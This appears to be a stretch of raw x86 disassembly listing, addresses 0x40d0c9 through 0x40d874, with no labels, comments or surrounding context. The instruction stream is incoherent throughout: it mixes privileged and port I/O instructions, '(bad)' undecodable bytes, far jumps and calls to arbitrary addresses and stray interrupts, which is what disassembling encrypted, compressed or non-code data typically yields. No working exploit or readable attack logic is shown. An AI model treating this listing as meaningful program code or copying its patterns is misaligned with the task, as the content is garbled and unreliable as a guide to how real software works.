  40d0c9:	loope  0x40d0cd
  40d0cb:	imul   ebx,DWORD PTR [ecx],0x5b2ceac
  40d0d1:	loopne 0x40d0bf
  40d0d3:	in     eax,0xc8
  40d0d5:	sub    eax,0xaf39574b
  40d0da:	out    0x8b,eax
  40d0dc:	int    0xc8
  40d0de:	mov    ebp,cr5
  40d0e1:	iret   
  40d0e2:	sbb    BYTE PTR [edi],0xd
  40d0e5:	inc    ebx
  40d0e6:	jle    0x40d10f
  40d0e8:	jecxz  0x40d09c
  40d0ea:	jmp    0xad95ea38
  40d0ef:	out    0xcb,eax
  40d0f1:	pop    edi
  40d0f2:	nop
  40d0f3:	pusha  
  40d0f4:	jo     0x40d086
  40d0f6:	push   ebx
  40d0f7:	cmc    
  40d0f8:	xchg   ebp,eax
  40d0f9:	mov    WORD PTR [edi+0x205e355d],cs
  40d0ff:	test   al,0x9c
  40d101:	shl    BYTE PTR [edi-0x40],0xdd
  40d105:	sbb    BYTE PTR [ebp+0x13],dh
  40d108:	dec    ebx
  40d109:	call   FWORD PTR [edx+0x3c]
  40d10c:	inc    edx
  40d10d:	aas    
  40d10e:	jne    0x40d16e
  40d110:	xchg   edx,eax
  40d111:	jo     0x40d0f8
  40d113:	xor    eax,0xf6e3a4fb
  40d118:	pop    edi
  40d119:	sbb    al,0x1b
  40d11b:	push   cs
  40d11c:	(bad)  
  40d11e:	je     0x40d10f
  40d120:	nop
  40d121:	fsub   st(6),st
  40d123:	pop    ss
  40d124:	mov    ebx,0x3285ee3
  40d12a:	pushf  
  40d12b:	mov    ah,0x2c
  40d12d:	bound  eax,QWORD PTR gs:[ecx]
  40d130:	jg     0x40d194
  40d132:	adc    eax,0x781ba93b
  40d137:	mov    ecx,0x10a30712
  40d13c:	mov    dl,BYTE PTR [ebx]
  40d13e:	xchg   ebx,eax
  40d13f:	sbb    BYTE PTR [esi-0xf],ah
  40d142:	js     0x40d1c1
  40d144:	imul   esp,DWORD PTR [eax-0x261de474],0x4c7f299c
  40d14e:	sub    eax,0xfad27b27
  40d153:	adc    al,0x31
  40d155:	sbb    BYTE PTR [edx-0x11f8342f],bl
  40d15b:	repnz pusha 
  40d15d:	jle    0x40d132
  40d15f:	mov    bl,BYTE PTR [esi]
  40d161:	mov    eax,0xf248b2cc
  40d166:	adc    BYTE PTR ds:0x6b864425,cl
  40d16c:	inc    eax
  40d16d:	jo     0x40d18b
  40d16f:	cs sbb al,0xe4
  40d172:	call   0x5baba55a
  40d177:	arpl   bx,cx
  40d179:	or     eax,0x9e04a8ee
  40d17e:	jae    0x40d103
  40d180:	jb     0x40d1d5
  40d182:	xor    ebp,DWORD PTR [edx-0x2bbab59e]
  40d188:	fs leave 
  40d18a:	cs mov bh,0x9e
  40d18d:	or     bh,BYTE PTR [edx]
  40d18f:	sbb    bh,BYTE PTR [eax]
  40d191:	dec    esp
  40d192:	mov    al,ds:0x3507aea0
  40d197:	lea    edi,[edx]
  40d199:	dec    esp
  40d19a:	add    al,0xb2
  40d19c:	daa    
  40d19d:	sbb    eax,0xe9ae62eb
  40d1a2:	adc    ah,BYTE PTR [eax+0x6f]
  40d1a5:	sub    BYTE PTR [ebx+0x13e79291],dl
  40d1ab:	clc    
  40d1ac:	xor    esp,ebp
  40d1ae:	xchg   ecx,eax
  40d1af:	fwait
  40d1b0:	nop
  40d1b1:	jo     0x40d219
  40d1b3:	gs dec ebx
  40d1b5:	cmp    eax,0x4f3a672a
  40d1ba:	mov    edx,0xc30df6c4
  40d1bf:	mov    dh,0x1d
  40d1c1:	jb     0x40d1e6
  40d1c3:	cmp    BYTE PTR [ebp+0x31],ah
  40d1c6:	push   edx
  40d1c7:	mov    ds:0x73ee03c2,eax
  40d1cc:	pop    esp
  40d1cd:	out    dx,al
  40d1ce:	shr    bh,1
  40d1d0:	fs add eax,0x9786cadd
  40d1d6:	mov    ch,0xcf
  40d1d8:	faddp  st(3),st
  40d1da:	jmp    0x40d225
  40d1dc:	jmp    0x49b92e63
  40d1e1:	cs pop ds
  40d1e3:	rol    DWORD PTR [esp+ebx*2],0x40
  40d1e7:	jno    0x40d1b2
  40d1e9:	mov    esp,0x73dbda6a
  40d1ee:	mov    eax,ds:0x36e576b4
  40d1f3:	cdq    
  40d1f4:	jbe    0x40d24a
  40d1f6:	mov    esp,0x569b5494
  40d1fb:	mov    eax,ds:0x8fe8e50e
  40d200:	mov    edi,0x4fec87ae
  40d205:	shr    BYTE PTR [eax+ebx*2+0x5634ee93],1
  40d20c:	mov    dh,0x97
  40d20e:	adc    eax,0x9a82adfd
  40d213:	and    ah,al
  40d215:	mov    bh,0xd8
  40d217:	lock push ebp
  40d219:	mov    dl,0xcf
  40d21b:	in     eax,0xdd
  40d21d:	outs   dx,DWORD PTR ds:[esi]
  40d21e:	rcl    BYTE PTR [edx-0x4f],cl
  40d221:	push   ds
  40d222:	jge    0x40d22a
  40d224:	mov    ebp,esp
  40d226:	jne    0x40d223
  40d228:	fwait
  40d229:	mov    dl,0x39
  40d22b:	mov    ds:0x68600007,eax
  40d230:	dec    ebx
  40d231:	not    esi
  40d233:	or     bh,BYTE PTR [ebx]
  40d235:	adc    cl,dl
  40d237:	leave  
  40d238:	ds sahf 
  40d23a:	bound  esi,QWORD PTR [ecx-0x6aa81458]
  40d240:	or     ebx,DWORD PTR [ecx-0x46]
  40d243:	or     BYTE PTR [eax],bl
  40d245:	jno    0x40d201
  40d247:	dec    esi
  40d248:	int    0xe
  40d24a:	mov    ds:0x6610c8b1,eax
  40d24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d250:	enter  0x796e,0x25
  40d254:	clc    
  40d255:	inc    ecx
  40d256:	call   0x7f57:0x92b92c28
  40d25d:	ror    DWORD PTR [ecx],1
  40d25f:	xchg   edi,eax
  40d260:	js     0x40d26a
  40d262:	lahf   
  40d263:	jne    0x40d2df
  40d265:	(bad)  
  40d267:	cmp    DWORD PTR [ebp+ecx*2-0x74],0x20
  40d26c:	lahf   
  40d26d:	adc    eax,0x93f673c5
  40d272:	pop    ss
  40d273:	inc    ebx
  40d274:	mov    eax,0xda584b46
  40d279:	imul   eax,edi,0xffffff87
  40d27c:	int    0x80
  40d27e:	jl     0x40d21d
  40d280:	mov    bl,0x1a
  40d282:	sbb    ah,BYTE PTR [edx-0x45]
  40d285:	dec    eax
  40d286:	loop   0x40d291
  40d288:	ds iret 
  40d28a:	inc    esi
  40d28b:	pop    ebx
  40d28c:	pop    ebp
  40d28d:	dec    ebp
  40d28e:	sbb    ah,BYTE PTR [ebp-0x7c00d6d8]
  40d294:	fdivr  QWORD PTR [ecx]
  40d296:	out    dx,al
  40d297:	cmp    BYTE PTR [esi+esi*1-0x7771727e],cl
  40d29e:	jl     0x40d278
  40d2a0:	out    dx,al
  40d2a1:	dec    edi
  40d2a2:	test   ebp,esp
  40d2a4:	jnp    0x40d313
  40d2a6:	fwait
  40d2a7:	dec    edx
  40d2a8:	and    bl,BYTE PTR [ebx-0x70914f67]
  40d2ae:	add    dh,al
  40d2b0:	sub    edx,DWORD PTR [ebp+0x1b4a033f]
  40d2b6:	or     dl,BYTE PTR [ebx]
  40d2b8:	rcl    eax,cl
  40d2ba:	push   0x748db1d9
  40d2bf:	add    DWORD PTR [esi],eax
  40d2c1:	int3   
  40d2c2:	xchg   ebx,eax
  40d2c3:	les    edx,FWORD PTR [esi+0x7e948fa3]
  40d2c9:	add    al,0xc8
  40d2cb:	scas   eax,DWORD PTR es:[edi]
  40d2cc:	cli    
  40d2cd:	daa    
  40d2ce:	mov    bh,dh
  40d2d0:	mov    ch,0xf9
  40d2d2:	les    ecx,FWORD PTR [edi+0xa]
  40d2d5:	mov    bl,0x12
  40d2d7:	ja     0x40d28a
  40d2d9:	cmp    DWORD PTR [esi],0x75d6d327
  40d2df:	push   esi
  40d2e0:	mov    bl,0x10
  40d2e2:	popf   
  40d2e3:	sub    BYTE PTR [ecx+0x22c5f6f8],dl
  40d2e9:	or     BYTE PTR [ecx],cl
  40d2eb:	loope  0x40d2d8
  40d2ed:	xchg   esi,eax
  40d2ee:	jno    0x40d2d1
  40d2f0:	repnz loopne 0x40d2cd
  40d2f3:	(bad)  
  40d2f4:	test   DWORD PTR [edi+0x401f6f8f],esi
  40d2fa:	imul   eax,DWORD PTR fs:[esi+0x8],0x7f6d570
  40d302:	das    
  40d303:	arpl   WORD PTR [eax-0x56],si
  40d306:	xchg   ecx,eax
  40d307:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d308:	mov    ch,0x25
  40d30a:	xchg   esi,eax
  40d30b:	cdq    
  40d30c:	pop    esp
  40d30d:	pop    edx
  40d30e:	xchg   edx,eax
  40d30f:	mov    ah,0x70
  40d311:	call   0xfc748b05
  40d316:	mov    eax,ds:0x53bcd764
  40d31b:	mov    ebx,0xc3cd221
  40d320:	leave  
  40d321:	jno    0x40d394
  40d323:	hlt    
  40d324:	dec    ebp
  40d325:	rcl    BYTE PTR [eax],cl
  40d327:	mov    ah,BYTE PTR [ebx+0x18]
  40d32a:	retf   0x3b66
  40d32d:	cmp    BYTE PTR [ebp+0x11f3e092],0x26
  40d334:	call   DWORD PTR [edx]
  40d336:	loop   0x40d371
  40d338:	adc    al,0x8c
  40d33a:	xor    al,0x74
  40d33c:	test   BYTE PTR [eax],0x36
  40d33f:	mov    dh,0x70
  40d341:	out    0xd7,al
  40d343:	jb     0x40d3b1
  40d345:	gs js  0x40d2fa
  40d348:	clc    
  40d349:	jmp    0x8689:0x6c469ce4
  40d350:	mov    WORD PTR [ecx-0x61],cs
  40d353:	mov    dh,0xe8
  40d355:	into   
  40d356:	pop    edi
  40d357:	nop
  40d358:	pop    ds
  40d359:	popf   
  40d35a:	add    eax,0x8ac1a547
  40d35f:	jge    0x40d2f5
  40d361:	les    esi,FWORD PTR [ebx-0x23fc68cc]
  40d367:	imul   esi,DWORD PTR [esi+0x164a1b42],0xa8c950d8
  40d371:	push   ebx
  40d372:	inc    edi
  40d373:	fs jg  0x40d33b
  40d376:	sub    eax,0x3546e4e4
  40d37b:	push   ds
  40d37c:	js     0x40d34d
  40d37e:	(bad)  
  40d37f:	neg    ecx
  40d381:	inc    edx
  40d382:	jge    0x40d3a4
  40d384:	pop    edi
  40d385:	ret    0x1133
  40d388:	add    esi,DWORD PTR [esi+0x500c425b]
  40d38e:	inc    esp
  40d38f:	repz sbb al,0x5
  40d392:	repz pop eax
  40d394:	push   esp
  40d395:	mov    ?,WORD PTR [ecx-0xb89c95b]
  40d39b:	dec    edi
  40d39c:	cs ror DWORD PTR gs:[edx-0x72761da5],cl
  40d3a4:	call   0x1f4e39de
  40d3a9:	gs ret 0x1768
  40d3ad:	pop    ebp
  40d3ae:	lea    edx,[edx]
  40d3b0:	jno    0x40d38a
  40d3b2:	out    0x17,eax
  40d3b4:	pushf  
  40d3b5:	fistp  DWORD PTR [esi+esi*1-0x57b7e821]
  40d3bc:	inc    edx
  40d3bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3be:	test   DWORD PTR [ecx+0x9c1a888],0xb509f33e
  40d3c8:	pusha  
  40d3c9:	jmp    0x856097f8
  40d3ce:	jbe    0x40d3a3
  40d3d0:	push   0xa141af22
  40d3d5:	jae    0x40d41b
  40d3d7:	xor    eax,0x915ea411
  40d3dc:	(bad)  
  40d3dd:	test   edi,ecx
  40d3df:	loop   0x40d420
  40d3e1:	ficomp WORD PTR [ebx]
  40d3e3:	fcmovnb st,st(2)
  40d3e5:	or     bl,BYTE PTR [edx-0x3d8c7bf]
  40d3eb:	out    0x5,al
  40d3ed:	dec    esi
  40d3ee:	xchg   BYTE PTR [eax+0x79],bh
  40d3f1:	ret    
  40d3f2:	inc    ebx
  40d3f3:	ins    BYTE PTR es:[edi],dx
  40d3f4:	or     BYTE PTR [edx+0x1c0864b2],al
  40d3fa:	jno    0x40d448
  40d3fc:	std    
  40d3fd:	rcl    DWORD PTR [eax-0x74],1
  40d400:	(bad)  
  40d401:	ror    DWORD PTR [edi+0x20],0x89
  40d405:	or     ch,bl
  40d407:	aas    
  40d408:	outs   dx,DWORD PTR ds:[esi]
  40d409:	inc    ebp
  40d40a:	or     eax,0xb8101e5e
  40d40f:	dec    ebp
  40d410:	dec    eax
  40d411:	data16 jb 0x40d3e1
  40d414:	(bad)  
  40d415:	mov    esi,0x15c0e0b9
  40d41a:	pushf  
  40d41b:	out    0x4e,al
  40d41d:	aad    0x0
  40d41f:	sti    
  40d420:	xchg   ecx,eax
  40d421:	lds    edx,FWORD PTR [eax]
  40d423:	(bad)  
  40d425:	mov    ch,0x5b
  40d427:	ja     0x40d461
  40d429:	inc    ebp
  40d42a:	cmc    
  40d42b:	ror    DWORD PTR [ebp+0x48],1
  40d42e:	outs   dx,DWORD PTR ds:[esi]
  40d42f:	dec    esp
  40d430:	je     0x40d409
  40d432:	push   ds
  40d433:	cwde   
  40d434:	jae    0x40d41c
  40d436:	mov    eax,ds:0x618bc094
  40d43b:	jge    0x40d40f
  40d43d:	mov    bh,0xcd
  40d43f:	test   al,0x17
  40d441:	mov    bl,0x6e
  40d443:	ror    DWORD PTR [esi-0x767b70e6],1
  40d449:	(bad)  
  40d44a:	xlat   BYTE PTR ds:[ebx]
  40d44b:	dec    edx
  40d44c:	sbb    DWORD PTR [ecx+edi*1],esi
  40d44f:	or     ecx,DWORD PTR [ecx-0x5b7f2ff0]
  40d455:	packssdw mm2,QWORD PTR [eax-0x48]
  40d459:	pop    edx
  40d45a:	lods   al,BYTE PTR ds:[esi]
  40d45b:	out    0x7c,al
  40d45d:	pop    eax
  40d45e:	std    
  40d45f:	je     0x40d43d
  40d461:	dec    edi
  40d462:	xchg   edi,eax
  40d463:	push   ss
  40d464:	(bad)  
  40d465:	fcmovnb st,st(2)
  40d467:	repnz imul eax,DWORD PTR [edx+0x6aeeec9d],0x988e25fd
  40d472:	dec    esp
  40d473:	fs or  eax,0xa7ca1b20
  40d479:	rol    edx,cl
  40d47b:	js     0x40d411
  40d47d:	xor    DWORD PTR [ebx],esp
  40d47f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d480:	inc    edi
  40d481:	data16 (bad) 
  40d483:	cmc    
  40d484:	pop    ds
  40d485:	pop    es
  40d486:	pusha  
  40d487:	push   ebx
  40d488:	outs   dx,BYTE PTR ds:[esi]
  40d489:	xchg   BYTE PTR [ecx-0x28],cl
  40d48c:	sub    al,0xcd
  40d48e:	shl    ebx,0x66
  40d491:	out    0xfc,al
  40d493:	push   ecx
  40d494:	dec    ecx
  40d495:	fisttp WORD PTR [ebp-0x5776a50d]
  40d49b:	cmp    al,0x79
  40d49d:	push   ebx
  40d49e:	icebp  
  40d49f:	in     eax,0x8f
  40d4a1:	sub    eax,0x8a2a5de7
  40d4a6:	inc    esi
  40d4a7:	xlat   BYTE PTR ds:[ebx]
  40d4a8:	inc    edi
  40d4a9:	fdiv   st(4),st
  40d4ab:	fwait
  40d4ac:	xor    edi,esi
  40d4ae:	nop
  40d4af:	sub    DWORD PTR [esp+ecx*4+0x9],0xffffffea
  40d4b4:	inc    ecx
  40d4b5:	sbb    DWORD PTR [eax+edx*2+0x12239f75],0xffffffee
  40d4bd:	fnsave [ebp+0x16]
  40d4c0:	jl     0x40d485
  40d4c2:	jl     0x40d470
  40d4c4:	loopne 0x40d4d3
  40d4c6:	and    bh,BYTE PTR [ebp+0x7b]
  40d4c9:	(bad)  
  40d4ca:	test   BYTE PTR [ebx],0x66
  40d4cd:	outs   dx,BYTE PTR ds:[esi]
  40d4ce:	mov    edi,0x64a23fd1
  40d4d3:	pop    ebx
  40d4d4:	nop
  40d4d5:	inc    ebx
  40d4d6:	mov    al,0x52
  40d4d8:	sar    DWORD PTR [ecx],1
  40d4da:	xchg   DWORD PTR [eax-0x4b1f0d54],edx
  40d4e0:	xor    DWORD PTR [edx+0x44],0xc0fd16f6
  40d4e7:	sbb    DWORD PTR [ecx+esi*2+0x1566bcd5],ebp
  40d4ee:	je     0x40d493
  40d4f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4f1:	(bad)  
  40d4f2:	popa   
  40d4f3:	xchg   ecx,eax
  40d4f4:	dec    edx
  40d4f5:	sub    eax,0x44239b22
  40d4fa:	(bad)  
  40d4fb:	in     eax,dx
  40d4fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4fd:	sbb    cl,al
  40d4ff:	sbb    ecx,0x2f
  40d502:	std    
  40d503:	push   ds
  40d504:	in     al,0x81
  40d506:	mov    esi,0x8c5b93ff
  40d50b:	cmp    eax,0xf8d2416c
  40d510:	add    eax,esi
  40d512:	aam    0x1b
  40d514:	popa   
  40d515:	lds    ebx,FWORD PTR [ebp+0x43d8f3d2]
  40d51b:	xchg   ch,bl
  40d51d:	inc    esi
  40d51e:	icebp  
  40d51f:	xchg   ecx,eax
  40d520:	xchg   esp,eax
  40d521:	int    0x3a
  40d523:	inc    edx
  40d524:	push   esi
  40d525:	pop    ebp
  40d526:	int    0xbf
  40d528:	(bad)  
  40d52a:	lahf   
  40d52b:	je     0x40d4e4
  40d52d:	leave  
  40d52e:	xchg   ebp,eax
  40d52f:	mov    ebp,0x9324ba68
  40d534:	xchg   edx,eax
  40d535:	mov    ebp,0xe2ac63b7
  40d53a:	test   DWORD PTR [ebp+0x5],edi
  40d53d:	rcl    DWORD PTR [ebx],1
  40d53f:	int3   
  40d540:	test   eax,0x4f587d93
  40d545:	adc    cl,BYTE PTR [ebx+0x25e06ea6]
  40d54b:	fcom   st(2)
  40d54d:	adc    BYTE PTR [ecx-0xe],dl
  40d550:	imul   ecx,DWORD PTR [eax],0xab84ccfc
  40d556:	xor    eax,0xb6efa4af
  40d55b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d55c:	jge    0x40d4fb
  40d55e:	sub    dl,BYTE PTR [edi+0x2f]
  40d561:	add    al,0x90
  40d563:	pop    eax
  40d564:	push   eax
  40d565:	enter  0x16ba,0xbd
  40d569:	mov    eax,DWORD PTR [eax]
  40d56b:	das    
  40d56c:	inc    edx
  40d56d:	xchg   BYTE PTR [ebp+0x48],ch
  40d570:	sub    ecx,DWORD PTR [esp+ebx*4-0x11]
  40d574:	fs add ebx,esp
  40d577:	nop
  40d578:	fbld   TBYTE PTR [edi]
  40d57a:	mov    ah,0xb
  40d57c:	retf   
  40d57d:	mov    al,0xb2
  40d57f:	in     al,0x1b
  40d581:	pop    edi
  40d582:	call   0x21f6:0xbd6c7e62
  40d589:	jmp    0xcc9011b9
  40d58e:	lea    ebp,[ecx+0x6f2846f4]
  40d594:	sbb    dl,bl
  40d596:	lods   al,BYTE PTR ds:[esi]
  40d597:	xor    eax,0x5f9b808a
  40d59c:	mov    BYTE PTR ds:0x6ceb9c75,dh
  40d5a2:	push   ebx
  40d5a3:	mov    edi,0x7498f35b
  40d5a8:	pop    ebx
  40d5a9:	sahf   
  40d5aa:	push   es
  40d5ab:	or     BYTE PTR [edx+0x4a],al
  40d5ae:	sbb    BYTE PTR [eax+0x51],ch
  40d5b1:	xor    DWORD PTR [eax-0x39dbd365],esi
  40d5b7:	test   BYTE PTR [edx-0x51c48ae4],ch
  40d5bd:	jb     0x40d613
  40d5bf:	mov    WORD PTR [eax-0x2309ba37],?
  40d5c5:	xor    al,0xd7
  40d5c7:	inc    BYTE PTR [ebx-0x62f9c066]
  40d5cd:	push   esi
  40d5ce:	es cmp al,0xcb
  40d5d1:	pushf  
  40d5d2:	cli    
  40d5d3:	adc    BYTE PTR [ebx+0x469c159a],ch
  40d5d9:	mov    esp,DWORD PTR [ebx+0x66]
  40d5dc:	inc    edx
  40d5dd:	in     eax,0xab
  40d5df:	jmp    FWORD PTR [ebx-0x2f]
  40d5e2:	and    cl,BYTE PTR [ebp+0x6cd1e229]
  40d5e8:	cmp    cl,BYTE PTR [edx-0x2c]
  40d5eb:	dec    esp
  40d5ec:	repz mov es:0x9a7df43e,eax
  40d5f3:	shl    DWORD PTR [edi+edi*8],0x12
  40d5f7:	cmovno eax,DWORD PTR [ebx]
  40d5fa:	js     0x40d5f1
  40d5fc:	xchg   edi,eax
  40d5fd:	stos   DWORD PTR es:[edi],eax
  40d5fe:	adc    BYTE PTR [edi],0xca
  40d601:	scas   eax,DWORD PTR es:[edi]
  40d602:	push   ds
  40d603:	push   ebp
  40d604:	mov    cl,0xf6
  40d606:	push   ds
  40d607:	lock mov dh,0xc0
  40d60a:	inc    edx
  40d60b:	neg    DWORD PTR [edx+ecx*1+0x46]
  40d60f:	dec    esi
  40d610:	retf   
  40d611:	lea    eax,[edx-0x63f7a0e1]
  40d617:	inc    DWORD PTR [ecx-0x28ab5887]
  40d61d:	jle    0x40d5e8
  40d61f:	not    BYTE PTR [ebp-0x7e]
  40d622:	pop    eax
  40d623:	adc    al,0xdd
  40d625:	call   0x8f0:0x77884ba5
  40d62c:	jns    0x40d61c
  40d62e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d62f:	push   edx
  40d630:	push   esi
  40d631:	adc    esp,DWORD PTR [edx+0x5028641f]
  40d637:	xor    DWORD PTR ds:[esi],ecx
  40d63a:	sti    
  40d63b:	xor    bl,BYTE PTR [ecx+0x40]
  40d63e:	rcl    BYTE PTR [eax-0x61619d15],1
  40d644:	xchg   ecx,eax
  40d645:	mov    BYTE PTR [ecx+eiz*2+0x45],dh
  40d649:	les    edx,FWORD PTR [edx+0x1e]
  40d64c:	jle    0x40d6c1
  40d64e:	mov    ds:0x28690aa3,al
  40d653:	xchg   edx,eax
  40d654:	ret    0x214f
  40d657:	aas    
  40d658:	mov    esi,0x9d48e7b5
  40d65d:	cmp    esp,DWORD PTR [edx+eiz*4+0x1578f26a]
  40d664:	aam    0xba
  40d666:	lds    ebp,FWORD PTR [ecx]
  40d668:	adc    eax,DWORD PTR [eiz*4+0x4b8b1c6a]
  40d66f:	in     eax,dx
  40d670:	xchg   BYTE PTR [ecx+eiz*1+0x32d90083],cl
  40d677:	mov    cl,0xac
  40d679:	xchg   ebx,eax
  40d67a:	jae    0x40d6a5
  40d67c:	inc    ebx
  40d67d:	daa    
  40d67e:	and    BYTE PTR [edx],dh
  40d680:	jge    0x40d6ec
  40d682:	retf   
  40d683:	loope  0x40d617
  40d685:	enter  0x17e0,0x6b
  40d689:	and    al,0x88
  40d68b:	iret   
  40d68c:	ret    
  40d68d:	mov    ebx,0x6417d19f
  40d692:	jmp    FWORD PTR [esi]
  40d694:	loopne 0x40d61f
  40d696:	inc    BYTE PTR ds:0xbf413468
  40d69c:	dec    edi
  40d69d:	sbb    eax,0xd9affd76
  40d6a2:	inc    esp
  40d6a3:	mov    bh,0x55
  40d6a5:	or     eax,0xd1b67bb
  40d6aa:	je     0x40d6e7
  40d6ac:	jge    0x40d6ea
  40d6ae:	mov    edi,0xa8819c4
  40d6b3:	xchg   DWORD PTR [edx],ecx
  40d6b5:	cdq    
  40d6b6:	loope  0x40d67d
  40d6b8:	in     eax,0x8a
  40d6ba:	pop    ss
  40d6bb:	pop    edi
  40d6bc:	mov    cl,0xd8
  40d6be:	inc    edi
  40d6bf:	loopne 0x40d6f1
  40d6c1:	fild   QWORD PTR [ebx+0x6]
  40d6c4:	mov    bl,0x31
  40d6c6:	cmp    BYTE PTR [ecx-0x79],0xf2
  40d6ca:	xchg   esi,eax
  40d6cb:	jo     0x40d6f4
  40d6cd:	adc    al,0xa
  40d6cf:	push   eax
  40d6d0:	cmp    dl,BYTE PTR [edi+0xe]
  40d6d3:	fidiv  WORD PTR [edx]
  40d6d5:	push   esp
  40d6d6:	push   es
  40d6d7:	xor    BYTE PTR [ecx],dl
  40d6d9:	fnstcw WORD PTR [ebp+0x5a985fcd]
  40d6df:	and    al,0x62
  40d6e1:	mov    edi,0xa0155c10
  40d6e6:	xchg   edi,eax
  40d6e7:	stos   DWORD PTR es:[edi],eax
  40d6e8:	inc    edx
  40d6e9:	cmp    DWORD PTR [ecx-0x27],esi
  40d6ec:	push   esp
  40d6ee:	mov    ch,0xb
  40d6f0:	mov    ebx,0x5e031487
  40d6f5:	setl   BYTE PTR [edx+0x67ee6ea1]
  40d6fc:	(bad)  
  40d6fe:	loope  0x40d716
  40d700:	ds push 0x558384a8
  40d706:	or     eax,0xc5e68930
  40d70b:	cwde   
  40d70c:	push   ecx
  40d70d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d70e:	jns    0x40d768
  40d710:	into   
  40d711:	imul   esp,DWORD PTR [esi+ebp*4],0x2229cd10
  40d718:	adc    DWORD PTR [edi+0x541a880e],0x34
  40d71f:	mov    edx,ebp
  40d721:	enter  0xb4da,0xab
  40d725:	jp     0x40d74f
  40d727:	dec    edi
  40d728:	(bad)  
  40d729:	mov    dh,0xe6
  40d72b:	ret    
  40d72c:	cmp    edx,DWORD PTR [ebx+eiz*1]
  40d72f:	jecxz  0x40d712
  40d731:	dec    edx
  40d732:	push   0x39f193c0
  40d737:	idiv   ah
  40d739:	add    al,0x5
  40d73b:	cmp    eax,edx
  40d73d:	push   eax
  40d73e:	into   
  40d73f:	lahf   
  40d740:	aad    0x28
  40d742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d743:	popa   
  40d744:	mov    al,ds:0x5f80f045
  40d749:	out    0x2c,eax
  40d74b:	rol    esi,cl
  40d74d:	lods   al,BYTE PTR ds:[esi]
  40d74e:	jl     0x40d7a6
  40d750:	adc    al,0x8e
  40d752:	push   ebp
  40d753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d754:	dec    esp
  40d755:	add    eax,edi
  40d757:	nop
  40d758:	add    bl,ah
  40d75a:	retf   0x22db
  40d75d:	jge    0x40d723
  40d75f:	push   ss
  40d760:	mov    ebp,0x8fc906b6
  40d765:	sub    bl,BYTE PTR [edi-0x309232d0]
  40d76b:	loopne 0x40d6fd
  40d76d:	jmp    0x3e0952f8
  40d772:	mov    dh,0x42
  40d774:	shl    ebp,0x4d
  40d777:	inc    esp
  40d778:	les    edx,FWORD PTR [edi+0x30feada7]
  40d77e:	xchg   bl,ch
  40d780:	cmp    al,0x44
  40d782:	push   edi
  40d783:	and    BYTE PTR [eax-0x5c],cl
  40d786:	jbe    0x40d77e
  40d788:	mov    WORD PTR [edi+ebx*2],?
  40d78b:	es adc al,0xb7
  40d78e:	mov    ds:0x7f15802a,al
  40d794:	lahf   
  40d795:	sbb    DWORD PTR ds:0x1aa04efb,0x7f741583
  40d79f:	adc    DWORD PTR [ebp+0x5f8e244b],ecx
  40d7a5:	jbe    0x40d750
  40d7a7:	mov    DWORD PTR fs:[edi+0x4be6c5aa],edx
  40d7ae:	inc    esp
  40d7af:	mov    esi,0x1897188c
  40d7b4:	mov    al,0x40
  40d7b6:	les    eax,FWORD PTR [esi]
  40d7b8:	je     0x40d742
  40d7ba:	aad    0x5e
  40d7bc:	sbb    al,0x68
  40d7be:	aam    0x29
  40d7c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7c1:	xor    eax,0xa58188bd
  40d7c6:	call   0x5c7b4d6c
  40d7cb:	cmp    eax,0x12e309ce
  40d7d0:	jmp    0x34:0x1b47e4f3
  40d7d7:	jno    0x40d7a9
  40d7d9:	fwait
  40d7da:	and    ch,BYTE PTR [ecx-0x16963afb]
  40d7e0:	pop    edx
  40d7e1:	mov    dh,0x3d
  40d7e3:	scas   al,BYTE PTR es:[edi]
  40d7e4:	mov    ebx,0x58b1ddbc
  40d7e9:	xor    eax,0x73dc26db
  40d7ee:	jbe    0x40d786
  40d7f0:	sub    edx,DWORD PTR [ecx-0x28]
  40d7f3:	mov    esi,0xe948bea3
  40d7f8:	jne    0x40d7a5
  40d7fa:	inc    ebp
  40d7fb:	push   edx
  40d7fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7fd:	lock push ss
  40d7ff:	fnstsw WORD PTR [ebp-0x1d783132]
  40d805:	in     eax,0x5
  40d807:	sbb    DWORD PTR [edi+eax*1+0xc],ebp
  40d80b:	sbb    DWORD PTR [eax+ecx*8-0x1d],ecx
  40d80f:	loopne 0x40d794
  40d811:	in     al,dx
  40d812:	sbb    eax,DWORD PTR [edi]
  40d814:	cs sti 
  40d816:	mov    ds:0x8af979cb,al
  40d81b:	into   
  40d81c:	popa   
  40d81d:	mov    ecx,0x37f7cd35
  40d822:	out    0xc2,al
  40d824:	outs   dx,DWORD PTR ds:[esi]
  40d825:	retf   0x900c
  40d828:	cs xchg ebx,eax
  40d82a:	outs   dx,DWORD PTR ds:[esi]
  40d82b:	or     DWORD PTR [ebx+0x47],edi
  40d82e:	mov    edx,0xd732e732
  40d833:	stos   BYTE PTR es:[edi],al
  40d834:	das    
  40d835:	icebp  
  40d836:	jmp    0x5bbe6563
  40d83b:	inc    ecx
  40d83c:	cwde   
  40d83d:	xchg   edi,eax
  40d83e:	shr    DWORD PTR [esi+0x48],cl
  40d841:	mov    al,ds:0xbafecc3b
  40d846:	xor    esp,DWORD PTR [esi+0x5f]
  40d849:	nop
  40d84a:	jecxz  0x40d7d0
  40d84c:	jecxz  0x40d880
  40d84e:	and    al,BYTE PTR ds:0xf4f4b46
  40d854:	pop    edi
  40d855:	dec    eax
  40d856:	in     eax,0x45
  40d858:	pusha  
  40d859:	jle    0x40d84f
  40d85b:	enter  0xfefc,0xdc
  40d85f:	or     DWORD PTR [edi+0x1c],edx
  40d862:	push   edx
  40d863:	jmp    0xd88b8a75
  40d868:	not    dh
  40d86a:	lods   eax,DWORD PTR ds:[esi]
  40d86b:	cwde   
  40d86c:	out    0x40,al
  40d86e:	int3   
  40d86f:	mov    cl,0x6c
  40d871:	ret    0x6b55
  40d874:	mov    cl,0x2c
